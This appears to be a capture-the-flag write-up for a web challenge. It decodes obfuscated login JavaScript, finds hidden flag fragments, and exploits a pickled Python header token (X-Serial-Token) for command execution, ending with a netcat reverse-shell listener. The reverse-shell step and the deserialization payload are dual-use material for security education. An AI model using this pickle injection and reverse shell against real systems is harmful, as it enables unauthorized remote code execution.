# Challenge description

http://chall.ehax.tech:8008/

# Soluce

## First step

When you fetch the main page, you get the following script:

```js
!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]

...
```

You can decode it with the site: https://enkhee-osiris.github.io/Decoder-JSFuck/

Which gives us:

```js
const _0x3645b3=_0x4842;function _0x4842(_0x19d358,_0x49968c){const _0x2ad82b=_0x2ad8();return _0x4842=function(_0x484299,_0x4da982){_0x484299=_0x484299-0x1f1;let _0x4c8636=_0x2ad82b[_0x484299];return _0x4c8636;},_0x4842(_0x19d358,_0x49968c);}(function(_0x4ff4ae,_0x561f72){const _0x2b38fa=_0x4842,_0x2d072e=_0x4ff4ae();while(!![]){try{const _0x20be76=parseInt(_0x2b38fa(0x1f5))/0x1+-parseInt(_0x2b38fa(0x206))/0x2*(parseInt(_0x2b38fa(0x205))/0x3)+parseInt(_0x2b38fa(0x202))/0x4+-parseInt(_0x2b38fa(0x1ff))/0x5+-parseInt(_0x2b38fa(0x1fd))/0x6*(parseInt(_0x2b38fa(0x201))/0x7)+-parseInt(_0x2b38fa(0x1f2))/0x8+parseInt(_0x2b38fa(0x1fa))/0x9*(parseInt(_0x2b38fa(0x1f9))/0xa);if(_0x20be76===_0x561f72)break;else _0x2d072e['push'](_0x2d072e['shift']());}catch(_0x1a16c9){_0x2d072e['push'](_0x2d072e['shift']());}}}(_0x2ad8,0xbdbb4));const form=document[_0x3645b3(0x1fe)](_0x3645b3(0x200));async function submitForm(_0x361a11){const _0xbae53f=_0x3645b3,_0x261004=await fetch(_0xbae53f(0x203),{'method':'POST','body':JSON[_0xbae53f(0x208)](_0x361a11),'headers':{'Content-Type':_0xbae53f(0x1f4)}});window[_0xbae53f(0x1f7)]='/welcome.png';}form[_0x3645b3(0x1f8)](_0x3645b3(0x1f6),_0x3f6721=>{const _0x43e2d2=_0x3645b3;_0x3f6721[_0x43e2d2(0x1f1)]();const _0x451641=document[_0x43e2d2(0x204)](_0x43e2d2(0x1fc)),_0x12fab0=document['getElementById'](_0x43e2d2(0x207));_0x451641[_0x43e2d2(0x1fb)]=='dreky'&&_0x12fab0['value']=='ohyeahboiiiahhuhh'?submitForm({'user':_0x451641['value'],'pass':_0x12fab0[_0x43e2d2(0x1fb)]}):alert(_0x43e2d2(0x1f3));});function _0x2ad8(){const _0x5aa71f=['2115056nOLZur','Invalid\x20username\x20or\x20password','application/json','206204rQEQbe','submit','location','addEventListener','4252550HZZkfV','18etmbIj','value','username','43194hBWQRV','querySelector','5935145KtOSgP','.login-form','238aTVShg','6015272rbWZkU','/login','getElementById','15cVIXSQ','34886FmgdQH','password','stringify','preventDefault'];_0x2ad8=function(){return _0x5aa71f;};return _0x2ad8();}
```

We see that

user --> dreky

password --> ohyeahboiiiahhuhh

Once logged in, it fetch the welcome.png and, before load it, fetch another page, if we use burp, we get the following page:

```html
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.21
Date: Sun, 16 Feb 2025 09:49:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1714
Connection: close

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dark Theme Login Form</title>
    <link rel="stylesheet" href="/part1_styles.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212;
            color: #ffffff;
        }

        .login-form {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.7);
            width: 300px;
        }

        .login-form h2 {
            margin-bottom: 20px;
            text-align: center;
        }
    
        input {
            width: 95%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 4px;
            background-color: #292929;
            margin: 10px 0px;
            color: #ffffff;
        }

        input::placeholder {
            color: #888;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px 0px;
        }

        .form-group button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <form class="login-form">
        <h2>Part 1 of the flag</h2>
        <br>
        <p>E4HX{oh<span hidden>_h3l1_</span></p>
    </form>
</body>

</html>
```

We can already see a hidden flag, the beginning of the flag: E4HX{oh_h3l1_

We can see that there is also a "part1_styles.css" file that we can access. 
In this file, there is this important part:

```css
.alert.success {
    background-color: #d4edda;
    color: #155724;
    secret: "/t0p_s3cr3t_p4g3_7_7";
}
```

So let's go to this famous page to see what it contains:

```html
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.9.21
Date: Sun, 16 Feb 2025 09:55:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1660
X-Serial-Token: gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVkcmVreZSFlFKULg==
Connection: close

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>What did you get??</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #121212;
            color: #ffffff;
        }

        .login-form {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.7);
            width: 300px;
        }

        .login-form h2 {
            margin-bottom: 20px;
            text-align: center;
        }
    
        input {
            width: 95%;
            padding: 8px;
            border: 1px solid #444;
            border-radius: 4px;
            background-color: #292929;
            margin: 10px 0px;
            color: #ffffff;
        }

        input::placeholder {
            color: #888;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px 0px;
        }

        .form-group button:hover {
            background-color: #0056b3;
        }
    </style>
</head>

<body>
    <form class="login-form">
        <h2>Part 2</h2>
        <p>Huh you reached the part 2, nice!!!</p>

        <h1>dreky</h1>

    </form>
</body>

</html>
```
When we are sent the page, there is this header:

X-Serial-Token: gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAVkcmVreZSFlFKULg==

We can suspect that it is a serialized object in Python. When we decode it, it try to execute the following command: "dreky". We can deduce that this command is executed by default when we access the page and 

```html
<h1>dreky</h1>
```

is the output of this command.


We will try to execute an other command by changing the header with the code [here](serialize.py)

We tried this with netcat, but we got the error 

```html
<h1>32512</h1>
```

on the html page, indicating that netcat is probably not available on the remote machine. So we tried with another way, the one in the [code](serialize.py).

We execute this command to listen on the port 8008 to get a reverse shell:

```bash
nc -lvnp 8008
```

Then we execute our python script. It gives us a reverse shell. You can find the flag with the command:

```bash
cat FLAG
```
